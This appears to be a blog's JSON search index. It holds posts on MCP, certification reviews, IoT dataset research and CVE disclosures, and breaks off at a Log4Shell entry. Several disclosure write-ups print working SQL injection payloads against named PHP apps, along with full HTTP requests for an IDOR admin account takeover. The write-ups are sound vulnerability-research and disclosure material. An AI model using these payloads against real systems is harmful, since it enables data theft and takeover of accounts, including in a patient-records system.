[
  
  {
    "title": "Model Context Protocol (MCP): The Emerging Standard Connecting AI to the Real World",
    "url": "/posts/mcp-introduction/",
    "categories": "Technology, AI",
    "tags": "technology, artificial inteligence",
    "date": "2025-10-09 08:00:19 +0700",
    "content": "Introduction As artificial intelligence continues to integrate into modern business operations, the need for a standardized way to connect AI models with real-world systems becomes more critical. The Model Context Protocol (MCP) addresses this challenge — an open standard that enables large language models (LLMs) and intelligent agents to interact securely with external tools, data sources, and services. MCP essentially allows AI systems like ChatGPT, Claude, or other LLMs to go beyond static responses and perform real, contextual actions across digital environments.  What Is MCP? According to CyberArk, the Model Context Protocol is a standardized framework designed to help AI agents and LLMs interact seamlessly with external systems such as APIs, cloud services, and enterprise databases. It acts as a bridge between artificial intelligence and the real world, providing a secure and consistent way for models to access, read, and execute data or actions through structured interfaces. In essence, MCP turns a language model from a passive conversational tool into an active agent capable of performing meaningful, auditable operations.  Why Does MCP Matter? Traditional AI integrations are often ad hoc and lack standardization. MCP changes that by introducing a universal language that allows models to communicate with multiple systems without custom integration work. This reduces development overhead and improves security posture through consistent governance and authentication layers. From a security perspective — as Red Hat emphasizes — MCP lays the foundation for secure AI interoperability. It ensures that every connection between an AI model and external resources is authenticated, authorized, and monitored, preventing context leakage, privilege escalation, and data misuse.  Who Created and Uses MCP? MCP originated as an open initiative from Anthropic, designed to complement the ecosystem of tools surrounding models like Claude. Since its introduction, it has been adopted and supported by key players such as Red Hat, CyberArk, and members of the broader open-source community. Developers, AI engineers, and cybersecurity professionals are increasingly leveraging MCP to build trustworthy AI agents that operate safely in enterprise environments, especially across hybrid and multi-cloud infrastructures.  When Is MCP Becoming Relevant? Introduced in 2024, MCP gained rapid attention as organizations recognized the risks of uncontrolled AI integrations. Entering 2025, its relevance has grown significantly as businesses seek to integrate AI into mission-critical workflows — from automated security monitoring to intelligent DevSecOps pipelines. MCP enables these integrations to happen securely, predictably, and in compliance with enterprise policies.  Where Is MCP Being Applied? MCP is being implemented in a wide range of contexts: from AI development environments and cloud orchestration to enterprise automation, cybersecurity operations, and identity governance. As Red Hat highlights, MCP helps maintain consistent security controls across distributed AI ecosystems. By isolating model contexts and managing permissions centrally, it ensures sensitive data remains protected, even when multiple AI agents are running in parallel.  How Does MCP Work and Stay Secure? MCP operates through a client-host-server architecture:    The client is the AI model or agent requesting information or performing actions.   The host mediates communication, enforces security policies, and validates permissions.   The server exposes external tools, APIs, or datasets that can be safely accessed.   CyberArk stresses the importance of identity-based controls, context isolation, and full audit trails for MCP deployments. Red Hat reinforces that a zero-trust approach and least-privilege principles must be applied to prevent unauthorized access or data leakage between AI sessions.  Objective The primary goal of the Model Context Protocol is to enable secure, standardized interoperability between AI and the systems it interacts with. MCP aims to make intelligent agents not only powerful but also transparent, governable, and compliant with modern cybersecurity principles. It defines how models can safely “see,” “understand,” and “act” within complex digital environments.  Benefits Organizations adopting MCP gain multiple strategic benefits:    Cross-platform interoperability, reducing integration time and vendor lock-in.   Enhanced security and visibility for every AI-initiated action.   Improved development efficiency for DevSecOps and AI engineering teams.   Compliance and governance assurance, aligning AI usage with enterprise policies. Ultimately, MCP allows businesses to embrace AI automation without compromising on control, oversight, or trust.   Conclusion The Model Context Protocol represents a pivotal step toward a future where artificial intelligence is both intelligent and secure. It transforms LLMs from passive models into context-aware, action-driven systems that operate safely within enterprise boundaries. For cybersecurity professionals, understanding MCP is not optional — it’s essential. As AI becomes more deeply embedded into infrastructure and decision-making, MCP provides the blueprint for connecting innovation with integrity, ensuring that the rise of intelligent agents does not come at the expense of security or governance.  References:    “What Is the Model Context Protocol (MCP)? - Model Context Protocol.” Modelcontextprotocol.io, Model Context Protocol, 2025, modelcontextprotocol.io/docs/getting-started/intro.   “Frequently Asked Questions on Model Context Protocol (MCP).” CyberArk, 2025, www.cyberark.com/what-is/model-context-protocol/.   “Model Context Protocol (MCP): Understanding Security Risks and Controls.” Redhat.com, 2025, www.redhat.com/en/blog/  "
  },
  
  {
    "title": "My Take on OSEP (PEN-300): Challenges, Lessons, and Real-World Relevance",
    "url": "/posts/osep-experience/",
    "categories": "Infosec, Certification",
    "tags": "infosec, certification, offsec",
    "date": "2024-12-12 20:00:19 +0700",
    "content": "Reflecting on OSEP (PEN-300) — Worth Taking in 2024? Recently, I went through several reviews from OSEP / PEN-300 participants — along with reflecting on my own experience — and wanted to share a summary of the key takeaways, strengths, and lessons that might help others better understand what to expect before enrolling in the course.  Course Scope — What You Learn PEN-300 covers two broad areas: client-side initial access techniques (Office macros, JScript, WSH), and AV/EDR evasion &amp; application whitelisting bypasses, followed by post-exploitation topics including escalation, pivoting, lateral movement, and Active Directory / MSSQL attacks. Content is delivered via text, video, and hands-on labs.  Labs &amp; Challenge Labs Each module includes practice labs; there are also six progressive challenge labs, with the final challenge closest to the exam environment. Multiple reviewers recommend repeating the challenge labs and varying payloads and toolchains to ensure readiness.  Exam — A Realistic Simulation The OSEP exam is structured like a simulated penetration test (commonly ~48 hours for exploitation plus time to write the report). Time management, clear documentation, and adaptability are crucial because the exam contains surprises and several rabbit holes (readmore).  Key Strengths    Strong up-skill for AV evasion and AD exploitation—valuable if you already have a baseline (e.g., OSCP, CRTP, CRTO, CRTE).   Practical labs that let you tune custom payloads and experiment with C2 solutions.   Emphasis on conceptual understanding rather than rote steps.   Limitations &amp; Considerations    Some techniques feel less relevant in hardened environments where macros/WSH are blocked.   Core materials haven’t radically changed; expect to supplement with external AD/red-team labs (HTB ProLabs, VulnLab) for up-to-date defensive coverage.   Limited content on operational security (how to mask activity at enterprise scale).   Practical Prep Tips    Repeat the challenge labs multiple times and vary your payloads.   Keep meticulous notes: payload snippets, commands, and detection telemetry.   Practice in external AD/red-team labs to see modern AV/EDR behavior (Cybernetics, Offshore, VulnLab).   Consider alternative C2 frameworks (Sliver, etc.) instead of relying solely on Metasploit.   Manage your time in the exam—take breaks, prioritize, and avoid getting stuck on a single host for too long.   Short Verdict OSEP (PEN-300) remains a worthy investment for offensive practitioners aiming to level up evasion and AD skills—provided you complement the official material with modern labs and practice to stay current versus enterprise defenses. If you already have foundational skills, OSEP delivers practical and immediately useful knowledge.  References    PEN-300: Evasion Techniques and Breaching Defenses   Evasion Techniques and Breaching Defenses (OSEP) Syllabus   OSEP Exam FAQ  "
  },
  
  {
    "title": "IoT Dataset Research: Curating Realistic Traffic for Security Analysis",
    "url": "/posts/iot-dataset-research/",
    "categories": "Infosec, IoT, Research",
    "tags": "iot, infosec, dataset",
    "date": "2023-12-12 20:00:19 +0700",
    "content": "Introduction This article outlines my work in researching Internet of Things (IoT) security and producing curated datasets for intrusion detection, protocol analysis, and machine-learning experiments. The focus is on practical, reproducible methods for capturing and labeling traffic that reflects real deployment conditions. Links to the underlying records are provided for verification and reuse.  Scope and Objectives    Build a minimal but representative IoT testbed (sensors/actuators, gateways, mixed radios).   Capture normal, attack, and mixed scenarios to support supervised and unsupervised studies.   Provide documented feature tables and clear methodology notes for reproducibility.   Publish through persistent repositories (e.g., Zenodo) with stable identifiers.   Methodology         Requirements &amp; Threat Model Select protocol families (Wi-Fi, ZigBee/XBee, CoAP, MQTT) and DoS/misuse patterns relevant to constrained devices.           Testbed Assembly Combine commodity boards, gateways, and low-power radios. Keep topology simple, documented, and repeatable.      Scenario Design            Normal: routine telemetry, command, and control flows.       Attack: controlled floods/misuse aligned to protocol behavior.       Mixed: realistic blends to observe detector drift and false positives.                Traffic Capture Record raw PCAPs with timestamps and device identifiers. Maintain capture notes (topology, firmware, run IDs).           Feature Engineering Extract packet/session attributes into structured tables; optionally apply dimensionality reduction for ML tasks. Retain a mapping from features to raw traces for auditability.      Documentation &amp; Publication Provide abstracts, scenario descriptions, feature dictionaries, and access guidance. Where necessary, restrict raw traces while publishing sanitized derivatives.   Dataset Portfolio (selected)         TCP FIN Flood and Zbassocflood IoT Dataset Normal, attack, and mixed scenarios across Wi-Fi and ZigBee (XBee), with feature-extraction details. Zenodo: https://zenodo.org/records/4431541           Ping Flood Attack Pattern Recognition on IoT Networks Labeled traffic and clustering results (e.g., K-Means) for ICMP flood behavior on Wi-Fi. Zenodo: https://zenodo.org/records/4436208           UDP Flood Attack Pattern on IoT Networks DoS-oriented UDP traffic captures suitable for detector benchmarking. Zenodo: https://zenodo.org/records/4436127           Constrained Application Protocol (CoAP) Dataset Message-level CoAP exchanges for analyzing constrained application behavior and misuse. Zenodo: https://zenodo.org/records/4436043           Message Queue Telemetry Transport (MQTT) Dataset Publish/subscribe patterns, session characteristics, and anomalous messaging scenarios. Zenodo: https://zenodo.org/records/4436172         Some records restrict raw files. Follow the request instructions on the respective Zenodo pages.   Engineering Notes    Realism over complexity: A small, heterogeneous lab generates more useful signals than synthetic traffic alone.   Explicit labels: Separate normal/attack/mixed runs simplify evaluation and reduce labeling errors.   Feature dictionaries: Document each attribute (name, type, units, derivation) to support replication and peer review.   Provenance: Keep run sheets (date, topology, firmware, parameters) to defend result integrity.   Governance and Ethics    Capture data only on systems under control or with explicit authorization.   Exclude human-sensitive payloads; sanitize metadata where applicable.   Prefer restricted access to raw traces if they expose device secrets; publish derived, anonymized features publicly.   Provide clear citation guidance and versioning for downstream users.   Reuse Guidelines    Benchmark IDS rules (Snort/Suricata) and ML classifiers on the labeled scenarios.   Compare protocol-specific indicators (e.g., Wi-Fi vs. ZigBee) to assess detector portability.   Cite dataset DOIs and include version numbers in methods sections.   Share improvements (e.g., new features or labels) with change logs for traceability.   Conclusion Well-designed IoT datasets bridge the gap between controlled experiments and operational realities. The collections above are structured to be auditable, reusable, and suitable for comparative studies. Feedback and collaboration are welcome—especially contributions that extend features, scenarios, or validation protocols. "
  },
  
  {
    "title": "My Journey in CVE Research: From Discovery to Disclosure",
    "url": "/posts/my-journey-in-cve-research-from-discovery-to-disclosure/",
    "categories": "Infosec, CVE, Research",
    "tags": "cve, infosec",
    "date": "2023-12-01 20:00:19 +0700",
    "content": "Introduction Researching software vulnerabilities and contributing to the CVE ecosystem is both a technical challenge and a responsibility. This post highlights my personal experience in vulnerability research—how I discovered flaws, validated them safely, and worked through the disclosure process that eventually led to public CVE assignments.    Why I Pursue CVE Research My motivation stems from three key goals:     Improving security in widely used applications.   Challenging myself through real-world vulnerability hunting.   Contributing to the community by documenting findings publicly in CVE databases, Exploit-DB, and security advisories.   Each CVE is not just a number; it reflects effort, analysis, communication, and a contribution toward a safer ecosystem.    Research Approach Here’s the typical workflow I follow when hunting vulnerabilities:          Reconnaissance &amp; Inventory Identify application versions, plugins, and changelogs—especially outdated or unpatched components.           Input Analysis Map input vectors such as id parameters, form fields, or embedded content options.           Proof-of-Concept (Non-Destructive) Craft controlled payloads to safely confirm the existence of flaws (e.g., blind SQLi timing, harmless XSS markers).           Manual Verification Cross-check results to avoid false positives and gather reproducible evidence.           Responsible Disclosure Contact vendors, share detailed steps, and allow remediation time before public release or CVE request.        Selected Research Outcomes Below are some of my published findings, with direct links to Exploit-DB and WPScan entries.  Exploit-DB Publications    Hospitals Patient Records Management System 1.0 – Account TakeOver   Hospitals Patient Records Management System 1.0 – ‘id’ SQL Injection (Authenticated)   Online Veterinary Appointment System 1.0 – ‘Multiple’ SQL Injection   Online Railway Reservation System 1.0 – ‘id’ SQL Injection (Unauthenticated)   Old Age Home Management System 1.0 – SQLi Authentication Bypass   CVE Publications (via WPScan)    CVE-2021-24614 – Book appointment Online &lt; 1.39 – Authenticated Stored XSS   CVE-2021-24621 – WP Courses LMS &lt; 2.0.44 – Authenticated Stored XSS via Video Embed Code   CVE-2021-24622 – WP Ticket &lt; 5.10.4 – Admin+ Stored XSS   CVE-2021-24623 – Advanced Ticket System &lt; 1.0.64 – Authenticated Stored XSS   CVE-2022-2395 – weForms &lt; 1.6.14 – Admin+ Stored XSS     Key Lessons Learned    Clear documentation accelerates vendor response.   Manual review is essential to confirm findings from automated scans.   Responsible disclosure builds trust and ensures vulnerabilities are patched safely.   Patience pays off—from discovery to CVE publication can be a lengthy process.     Conclusion CVE research is about persistence, responsibility, and contributing back to the community. Every published CVE is a small step toward better security for everyone. My journey continues, and I hope sharing this process helps aspiring security researchers understand not only the how but also the why of vulnerability disclosure.   "
  },
  
  {
    "title": "[English] CEH Practical Certification Exam Experience",
    "url": "/posts/english-ceh-practical-certification-exam-experience/",
    "categories": "Certification",
    "tags": "certification, infosec",
    "date": "2022-01-22 15:09:19 +0700",
    "content": "Introduction This is my personal experience taking the CEH Practical exam—shared for anyone who is preparing for or considering the certification.  I first learned about the CEH Practical Scholarship in 2020, which reduced the exam fee to around $99 (from ~$550). I followed the instructions, received an Aspen dashboard code, and secured a scholarship slot toward the end of 2020.  I didn’t take the exam immediately because I was focused on OSCP. I activated the Aspen code around June 2021 and finally sat the CEH Practical near its expiry window.    CEH Practical Overview The CEH Practical is a proctored exam (e.g., via Aspen) with real-world scenarios instead of multiple-choice questions.  Key Specs:    Exam Title: Certified Ethical Hacker (Practical)   Number of Practical Challenges: 20   Duration: 6 hours   Availability: Aspen – iLabs   Test Format: iLabs Cyber Range   Passing Score: 70%   Open Book: Yes   Unlike the CEH (ANSI) multiple-choice exam (4 hours), the Practical runs in Aspen iLabs, providing two machines—Parrot OS and Windows 10—for you to investigate and submit answers during the session.  Topics commonly covered:    Network scanning to identify live hosts, ports, and services   OS detection and enumeration of active hosts   System hacking, steganography, cryptography   Packet sniffing and deep packet inspection of .pcap/.pcapng files   Web application security (e.g., SQL Injection)   Hash and password cracking   Tools I used (examples):    Scanning &amp; Reconnaissance: nmap   Sniffing: Wireshark, tcpdump   Web App Attacks: Burp Suite, OWASP ZAP, sqlmap   Brute Force &amp; Cracking: hydra, John the Ripper   Cryptography: HashCalc, md5sum, VeraCrypt, CryptoForge, BCTextEncoder, SONAR.exe, CrypTool   Steganography: OpenStego   Supporting tools (Linux RDP/remote): Remmina, xfreerdp    Exam Preparation Here are the practical things that helped me:     Stable internet is crucial. In my case, the Parrot OS and Windows 10 VMs in Aspen iLabs felt slow, so patience mattered.   Read and follow the proctor’s instructions and rules carefully.   Proctoring setup. I used GoToMeeting installed on my laptop. The proctor monitored via webcam, screen share, and microphone.   Use a compatible browser (Firefox/Chrome) to access iLabs.   Open book is allowed. Prepare reference sites or your favorite cheatsheets. Googling for commands and docs is permitted within the rules.   No discussions with others. Keep your phone away and make sure you’re alone in the room.   Break time: You get 15 minutes for a quick rest or restroom break.   During the exam, respect all rules, stay patient with the lab performance, and focus on each task.  After finishing, talk to the proctor before clicking “Submit.” Your result appears on your Aspen account shortly after, along with the exam transcript, PDF certificate, digital badge, and the CEH Practical logo.    Notes &amp; Disclaimer    This post reflects my personal experience and timeline.   Tools and topics listed are examples, not an official syllabus.   Always comply with laws and exam policies.   Content is shared for educational purposes only.   Verification "
  },
  
  {
    "title": "[Bahasa] Pengalaman Ujian Sertifikasi CEH Practical",
    "url": "/posts/bahasa-pengalaman-ujian-sertifikasi-ceh-practical/",
    "categories": "Certification",
    "tags": "certification, infosec",
    "date": "2022-01-22 15:09:19 +0700",
    "content": "Pendahuluan Ini adalah cerita pengalaman saya mengikuti ujian CEH Practical yang ingin saya bagikan kepada orang - orang yang sedang atau ingin mengambil sertifikasi CEH Practical.  Kesempatan yang saya dapatkan untuk mengambil untuk mengikuti ujian sertifikasi CEH Practical, ketika membaca informasi mengenai CEH Practical Scholarship pada tahun 2020, yang memberikan harga sekitar $99 dari harga normal yaitu sekitar $550, hal tersebut membuat saya tidak menyiakan kesempatan, dengan mengikuti intruksi - intruksi dan akhirnya mendapatkan kesempatan untuk exam (scholarship) pada akhir tahun 2020 dengan diberikan code dashboard Aspen.  Saya tidak mengambil exam tersebut secara langsung setelah mendapatkan code Aspen, dikarenakan sedang fokus ke sertifikasi OSCP, jadi code tersebut saya simpan kemudian saya aktifkan sekitar bulan juni 2021, dan berkesempatan mengambil ujian dipenghujung akhir masa kadaluarsa untuk ujian CEH Practical tersebut.  CEH Practical Ujian CEH Practical merupakan ujian yang di-proctor atau diawasi oleh pihak penyedia seperti Aspen. Dengan jumlah soal terdiri dari 20 soal real-life scenarios, dan waktu pengerjaan selama 6 jam.  Berikut spesifikasi untuk CEH Practical:  Exam Title: Certified Ethical Hacker (Practical)    Number of Practical Challenges: 20   Duration: 6 hours   Availability: Aspen – iLabs   Test Format: iLabs Cyber Range   Passing Score: 70%   Open Book: Yes   CEH Practical sangat berbeda dengan CEH yang sering kita ketahui pada umumnya, atau yang sering disebut dengan CEH ANSI yang memberikan pengalaman untuk ujian sertifikasi tersebut dengan menjawab pertanyaan multiple-choice/pilihan ganda dengan waktu/durasi penyelasaian selama 4 jam. Hal tersebut yang menjadi pembanding dengan CEH Practical, yaitu untuk CEH Practical menggunakan Aspen- iLabs yang akan memberikan kita dua mesin sistem operasi yaitu Parrot OS dan Windows 10 untuk mencari jawaban selama ujian.  Topik - topik yang termasuk dalam CEH Practical:     Network scanning untuk mengidentifikasikan host,port dan service yang aktif pada sebuah network/jaringan.   Dapat mengidentifikasikan sistem operasi (OS),serta enumeration pada host/mesin yang aktif   Melakukan proses system hacking, steganography,crypthograpy   Packet Sniffing, dan mengerti mengenai deep packet inpection pada sebuah file .pcap/.pcapng   Web application security, seperti SQL injection   Cracking hash dan password   beberapa tools yang saya gunakan sesuai dengan pengalaman saya, antara lain:     Scanning &amp; Reconnaissance: nmap   Sniffing: wireshark,tcpdump   Web application attacks: burp suite, owasp zap tools, sqlmap   Brute-force attack dan password cracking: hydra, john the ripper   Crypthography: HashCalc, md5sum, veracrypt, cryptoforge, BCTextEncoder Utility, SONAR.exe, Cryptool   Steganography: open stego   dan beberapa tool pendukung seperti untuk remote desktop yang ada pada linux, antara lain: remmina, xfreerdp  Persiapan Ujian Beberapa hal yang harus dipersiapkan untuk ujian, antara lain:     Pastikan koneksi internet anda stabil dan baik, sehingga tidak ada kendala selama mengikuti ujian, dan pengalaman saya mesin Parrot OS dan Windows 10 yang diakses dari Aspen - iLabs sangat slows.   Baca dan ta’ati intruksi &amp; aturan yang diberikan oleh proctor.   Persiapkan tools protocor. Pada saat saya ujian, saya menggunakan gotomeeting yang terinstall di laptop saya,kemudian proctor akan memantau kegiatan anda, melalui webcam, sharing screen, dan microphone.   Menggunakan browser, seperti firefox,chrome, dikarenakan untuk mengakses iLabs wajib menggunakan browser.   Silahkan persiapkan website pendukung anda, baik berupa cheatsheet yang anda sukai atau googling saja, karena hal tersebut tidak dilarang.   Tidak dianjurkan berdiskusi dengan orang lain, handphone, dan juga pastikan dalam ruangan anda tidak boleh ada orang lain selain anda.   Anda diberikan waktu 15 menit untuk istirahat atau ke toilet. Selama mengikuti ujian pastikan menaati aturan - aturan yang diberikan, dan pastikan butuh kesabaran yang besar ketika mengakses mesin Aspen - iLabs dan fokus pada setiap task/soal - soal.   Setelah selesai mengerjakan pastikan berkomunikasi terlebih dahulu dengan proctor sebelum meng-click “Submit”. Setelah proses submitting jawaban kita, hasil kelulusan akan langsung diumumkan di akun Aspen kita, dan akan diberikan hasil transcript ujian,sertifikasi pdf, badge digital, beserta logo CEH Practical.  Catatan &amp; Pernyataan Penolakan    Postingan ini mencerminkan pengalaman pribadi saya dan urutan waktu.   Alat dan topik yang tercantum hanyalah contoh, bukan kurikulum resmi.   Selalu patuhi hukum dan kebijakan ujian.   Konten dibagikan untuk tujuan pendidikan saja.   Verifikasi "
  },
  
  {
    "title": "Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)",
    "url": "/posts/online-railway-reservation-system-1.0/",
    "categories": "Infosec, CVE, Research",
    "tags": "cve, infosec",
    "date": "2022-01-08 20:00:19 +0700",
    "content": "- Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated) - Date: 07/01/2022 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/orrs.zip - Version: v1.0 - Tested on: Kali Linux 2021.4,PHP 7.4.26 - Exploit-DB: https://www.exploit-db.com/exploits/50646   Introduction  As part of my routine web-application security research, I reviewed the Online Railway Reservation System (ORRS) v1.0 from SourceCodester. My objective was straightforward: understand the data flow behind its reservation feature and assess whether user-controlled inputs are safely handled before reaching the database. This write-up outlines what I tested, what I found, and how I suggest fixing it—without fluff and with enough detail for developers and security teams to act.  Summary of the Finding  I identified a time-based blind SQL injection affecting the reservation flow via the sid (or id) parameter processed by the page ?page=reserve. By inducing measurable response delays with crafted input, it was possible to confirm that SQL execution depends on unsafely concatenated user input.  My Process &amp; Reproduction Steps  While navigating Schedule → Book (Reservation Form), I noticed the page accepted a schedule identifier in the query string:  /orrs/?page=reserve&amp;sid=1   To probe whether sid was directly interpolated into SQL, I used a standard time-delay approach. I sent a payload designed to pause execution on the database side and watched for server response delays:  /orrs/?page=reserve&amp;sid=1') AND (SELECT 6842 FROM (SELECT(SLEEP(5)))UsWr) AND ('WBCm'='WBCm   Observed result: The server consistently delayed its response by ~5 seconds, a strong indicator that user input flowed into a SQL expression without proper parameterization. Scope &amp; restraint: All testing was performed in a local lab environment with non-destructive, observation-only techniques. "
  },
  
  {
    "title": "Online Veterinary Appointment System v1.0 — Multiple SQL Injection via id in Appointment Details)",
    "url": "/posts/online-veterinary-appointment-system-v1.0-multiple-sql-injection-via-id-in-Appointment-details/",
    "categories": "Infosec, CVE, Research",
    "tags": "cve, infosec",
    "date": "2022-01-05 20:00:19 +0700",
    "content": "- Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection - Date: 05/01/20222 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15119/online-veterinary-appointment-system-using-phpoop-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/ovas.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB: https://www.exploit-db.com/exploits/50644   Introduction  I examined OVAS v1.0 to evaluate how its admin dashboard handled user-controlled identifiers that flow into database queries. Appointment management looked like a likely entry point: it exposes a detail view driven by a numeric id that is passed through the query string. My aim was to confirm whether the application enforced proper server-side input handling and to determine the impact if user input reached SQL without parameterization. The review was done in a controlled local environment using non-destructive techniques, focusing on deterministic timing behavior to avoid altering data  Summary of the Finding  OVAS v1.0 is vulnerable to multiple SQL injection conditions in the appointment details path where the id parameter is used to fetch a record. By injecting a time-delay expression into id, the server’s response becomes predictably slower, indicating that untrusted input is being concatenated into a SQL statement. In practice, this opens a path to enumerate database contents or stage more invasive actions, depending on permissions. The issue stems from missing parameterization and insufficient server-side validation on the id field within the appointment view workflow.  My Process &amp; Reproduction Steps     From an authenticated admin session, I navigated to Dashboard → Appointment Requests:   http://localhost/ovas/admin/?page=appointments   Selecting Action → View loads the appointment detail view and passes a record identifier via query string.          The detail page requests data using an id parameter (e.g., ?page=appointments/view_details&amp;id=1). This parameter is the primary candidate for injection testing because it directly influences which record is returned.           I replaced the numeric identifier with a delay construct to test whether input reached SQL unescaped. The following request consistently induced a ~5-second delay:      /ovas/admin/?page=appointments/view_details&amp;id=1' AND (SELECT 2197 FROM (SELECT(SLEEP(5)))DZwi) AND 'mQQq'='mQQq           The repeatable delay confirmed a time-based blind SQL injection in the id parameter.           Given the confirmed injection point, an attacker could pivot to enumeration or data extraction using boolean/time-based strategies or automate with tools like sqlmap. My validation stopped at timing confirmation to avoid modifying data. The root cause remains lack of parameterized queries and missing server-side validation for the id input.     "
  },
  
  {
    "title": "Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)",
    "url": "/posts/hospital-patient-records-management-system-v1.0-sqli/",
    "categories": "Infosec, CVE, Research",
    "tags": "cve, infosec",
    "date": "2021-12-30 20:00:19 +0700",
    "content": "- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated) - Date: 2021-12-30 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB link: https://www.exploit-db.com/exploits/50630   Introduction  During a focused review of HPRMS v1.0, I set out to evaluate the integrity of its record-view workflow inside the admin area—specifically how user-controlled identifiers are validated before being passed to the database. CRUD pages that accept object IDs via query strings are frequent culprits for SQL injection when input handling is inconsistent. My goal was to trace the patient-view code path, determine whether the id parameter was parameterized, and validate any issues in a safe, non-destructive way.    Summary of the Finding  HPRMS v1.0 is vulnerable to a time-based blind SQL injection on the patient detail page. An authenticated user can supply crafted input in the id query parameter to trigger database delays, demonstrating that the application concatenates user input into a SQL expression without using parameterized queries. In practice, this allows an attacker to infer or extract data over time by encoding questions into time delays, even when no error messages or data are directly returned.    Reproduction steps (tested on local instance)    Performed only on a local test instance for verification and learning.      From the admin dashboard, I navigated to Patient List → Action → View Records, which loads a patient detail page using a query-string identifier:   http://localhost/hprms/admin/?page=patients/view_patient&amp;id=1           This confirmed that the object ID (id) is taken from the URL and likely used to select a specific patient record.  twseptian’s website           To test whether the id is safely handled, I issued a standard time-based blind payload that asks the database to sleep before responding. Example (single-quote close + boolean + delay):      page=patients/view_patient&amp;id=1' AND (SELECT 2664 FROM (SELECT(SLEEP(5)))ixec) AND 'XcAY'='XcAY   The server’s response consistently delayed by roughly five seconds, confirming that user input flowed into a SQL context without parameterization. The behavior required an authenticated session to reach the patient view. "
  },
  
  {
    "title": "Hospitals Patient Records Management System v1.0 — IDOR (Account Takeover)",
    "url": "/posts/hospital-patient-records-management-system-v1.0-idor/",
    "categories": "Infosec, CVE, Research",
    "tags": "cve, infosec",
    "date": "2021-12-20 20:00:19 +0700",
    "content": "- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' Insecure direct object references (IDOR) leads to Account TakeOver - Date: 2021-12-30 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB link: https://www.exploit-db.com/exploits/50631   Introduction  I reviewed HPRMS v1.0 to assess how its admin area handles identity and authorization in routine CRUD flows. Applications with profile-edit features often expose object identifiers directly, and these are prime candidates for insecure direct object references (IDOR). My goal was to trace the update path for user profiles, verify whether object access was enforced server-side, and confirm the impact if it was not.    Summary of the Finding The user profile update flow in HPRMS v1.0 contains an insecure direct object reference (IDOR) that allows any authenticated low-privileged user to modify other users’ accounts, including the built-in administrator, by altering the client-supplied id parameter in the update request. Because the backend trusts this identifier without verifying ownership or enforcing object-level authorization, an attacker can overwrite the administrator’s username and password and then sign in as admin, effectively achieving full account takeover. This stems from missing server-side access controls on update operations and the reliance on a predictable, user-controlled object identifier.    Reproduction steps (tested on local instance)    Performed only on a local test instance for verification and learning.      Authenticate as a low-privilege user (for example, user1, id 4).   Open the account/profile update form and trigger a profile save operation.   Intercept the outgoing POST to classes/Users.php?f=save. The request contains fields such as id, firstname, lastname, username, password, and img.   POST /hprms/classes/Users.php?f=save HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------17632878732301879013646251239 Content-Length: 806 Origin: http://localhost Connection: close Referer: http://localhost/hprms/admin/?page=user Cookie: PHPSESSID=32kl57ct3p8nsicsrp8dte2c50 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin  -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"id\"  4 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"firstname\"  user1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"lastname\"  admin -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"username\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"password\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"img\"; filename=\"\" Content-Type: application/octet-stream   -----------------------------17632878732301879013646251239--      Change id from 4 to the administrator id (commonly 1) and alter the username/password values in the intercepted request.   POST /hprms/classes/Users.php?f=save HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------17632878732301879013646251239 Content-Length: 806 Origin: http://localhost Connection: close Referer: http://localhost/hprms/admin/?page=user Cookie: PHPSESSID=32kl57ct3p8nsicsrp8dte2c50 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin  -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"id\"  1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"firstname\"  user1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"lastname\"  admin -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"username\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"password\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"img\"; filename=\"\" Content-Type: application/octet-stream   -----------------------------17632878732301879013646251239--      Forward the modified request. If the server accepts it without validating ownership or role, the attacker has effectively taken over the admin account.   "
  },
  
  {
    "title": "CVE-2021-44228 (Log4Shell) — Field Notes from a Focused Web-App Review",
    "url": "/posts/cve-2021-44228/",
    "categories": "Infosec, CVE, Research",
    "tags": "cve, infosec",
